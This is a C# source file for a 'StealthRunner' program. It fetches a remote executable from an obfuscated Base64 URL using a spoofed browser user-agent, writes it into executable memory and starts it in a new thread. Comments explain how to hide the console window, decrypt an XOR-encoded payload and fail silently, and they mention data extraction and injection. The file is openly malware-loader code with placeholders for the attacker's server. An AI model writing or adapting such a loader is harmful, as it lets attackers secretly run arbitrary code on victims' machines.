using System;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Text; // For Base64 encoding/decoding

// To make this a "Windows Application" and hide the console by default when double-clicked,
// you need to set the OutputType to WinExe in your .csproj file if using `dotnet build`:
//
// <Project Sdk="Microsoft.NET.Sdk">
//   <PropertyGroup>
//     <OutputType>WinExe</OutputType>
//     <TargetFramework>net8.0</TargetFramework> // Or your preferred .NET version (e.g., net6.0, net7.0)
//     <ImplicitUsings>enable</ImplicitUsings>
//     <Nullable>enable</Nullable>
//   </PropertyGroup>
// </Project>
//
// If compiling manually with csc.exe (older .NET Framework style), you'd use the /target:winexe switch.

public class StealthRunner
{
    // --- P/Invoke Signatures for Windows API Calls ---

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress, // This will be the pointer to our code in memory
        IntPtr lpParameter,
        uint dwCreationFlags,
        out uint lpThreadId); // Receives the thread identifier

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint WaitForSingleObject(
        IntPtr hHandle,
        uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern bool VirtualFree(
        IntPtr lpAddress,
        uint dwSize,
        uint dwFreeType);

    // --- Constants for Memory Allocation and Threading ---
    const uint MEM_COMMIT_RESERVE = 0x00001000 | 0x00002000; // MEM_COMMIT | MEM_RESERVE
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint MEM_RELEASE = 0x8000;
    const uint INFINITE = 0xFFFFFFFF;

    // --- Configuration ---
    // Replace with your actual Base64 encoded URL
    static string encodedUrl = "REPLACE_WITH_YOUR_BASE64_ENCODED_URL";
    // Example: "aHR0cHM6Ly9zb21lZG9tYWluLmNvbS9wYXlsb2FkLmV4ZQ=="

    // This will be decoded from encodedUrl.
    // If encodedUrl is not a valid Base64 string or is the placeholder, this will need to be set directly.
    static string targetUrl = "";

    public static async Task Main(string[] args)
    {
        // Decode the URL
        try
        {
            if (encodedUrl == "REPLACE_WITH_YOUR_BASE64_ENCODED_URL" || string.IsNullOrEmpty(encodedUrl))
            {
                // Fallback or direct assignment if no valid encoded URL is provided
                targetUrl = "YOUR_FALLBACK_OR_DIRECT_EXE_URL_HERE"; // <-- IMPORTANT: SET A VALID URL HERE IF NOT USING ENCODED
                if (targetUrl == "YOUR_FALLBACK_OR_DIRECT_EXE_URL_HERE") {
                     // In a real scenario, you'd probably exit or have a non-placeholder default.
                     // For this example, we'll let it try and likely fail if no valid URL is set.
                     Console.Error.WriteLine("Error: Target URL not configured."); // This would show if console not hidden
                     return;
                }
            }
            else
            {
                targetUrl = Encoding.UTF8.GetString(Convert.FromBase64String(encodedUrl));
            }
        }
        catch (FormatException)
        {
            // Handle invalid Base64 string if necessary, or let it fail silently for CTF
            // For debugging, you might write to a log or a hidden trace.
            return; // Exit if URL decoding fails
        }


        byte[] exeBytes = null;
        IntPtr memBuffer = IntPtr.Zero;
        IntPtr threadHandle = IntPtr.Zero;

        try
        {
            // 1. Download the executable
            using (HttpClient client = new HttpClient())
            {
                client.DefaultRequestHeaders.UserAgent.ParseAdd("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36");
                HttpResponseMessage response = await client.GetAsync(targetUrl);
                
                // You might want to check response.IsSuccessStatusCode more subtly in a real payload
                if (!response.IsSuccessStatusCode) {
                    return; // Fail silently
                }
                exeBytes = await response.Content.ReadAsByteArrayAsync();
            }

            if (exeBytes == null || exeBytes.Length == 0)
            {
                return; // Nothing to execute
            }

            // 2. Optional: Decrypt/Deobfuscate the payload
            // If your exeBytes are encrypted, decrypt them here. Example:
            // byte[] decryptionKey = Encoding.UTF8.GetBytes("your_secret_key_here");
            // exeBytes = XorDecrypt(exeBytes, decryptionKey);


            // 3. Allocate memory and copy payload
            uint exeSize = (uint)exeBytes.Length;
            memBuffer = VirtualAlloc(IntPtr.Zero, exeSize, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);

            if (memBuffer == IntPtr.Zero)
            {
                // Allocation failed - Marshal.GetLastWin32Error() could give details
                return; // Fail silently
            }

            Marshal.Copy(exeBytes, 0, memBuffer, exeBytes.Length);

            // 4. Create a new thread to run the executable from memory
            // CAVEAT: As stated before, this is a highly simplified execution attempt.
            // It assumes the PE can run from its base address without relocation or import resolution.
            uint threadId;
            threadHandle = CreateThread(IntPtr.Zero, 0, memBuffer, IntPtr.Zero, 0, out threadId);

            if (threadHandle == IntPtr.Zero)
            {
                // Thread creation failed
                VirtualFree(memBuffer, 0, MEM_RELEASE); // Clean up allocated memory
                return; // Fail silently
            }

            // Optional: Wait for the thread to finish.
            // For a data extractor, you might want it to run and then this loader can exit,
            // or you might wait if the payload is short-lived.
            // WaitForSingleObject(threadHandle, INFINITE);

            // The thread is now running (or has attempted to run) the code from memBuffer.
        }
        catch (HttpRequestException) { /* Fail silently on network errors */ }
        catch (ArgumentNullException) { /* Fail silently if URL is null/empty after decode */ }
        catch (Exception) { /* Catch all other exceptions and fail silently */ }
        finally
        {
            // Clean up
            if (threadHandle != IntPtr.Zero)
            {
                CloseHandle(threadHandle);
            }

            // IMPORTANT: Memory at `memBuffer` is NOT freed here if the thread is successfully
            // running the payload from it. Freeing it would crash the payload.
            // The OS will reclaim this memory when the host process (this C# program) exits.
            // If this loader process needs to exit while the payload continues to run independently
            // (classic injection), that's a more advanced scenario where the payload needs to be
            // self-sufficient or injected into another process.
        }
    }

    // Example XOR decryption function (if you use it)
    // static byte[] XorDecrypt(byte[] data, byte[] key)
    // {
    //     byte[] decryptedOutput = new byte[data.Length];
    //     for (int i = 0; i < data.Length; i++)
    //     {
    //         decryptedOutput[i] = (byte)(data[i] ^ key[i % key.Length]);
    //     }
    //     return decryptedOutput;
    // }
}
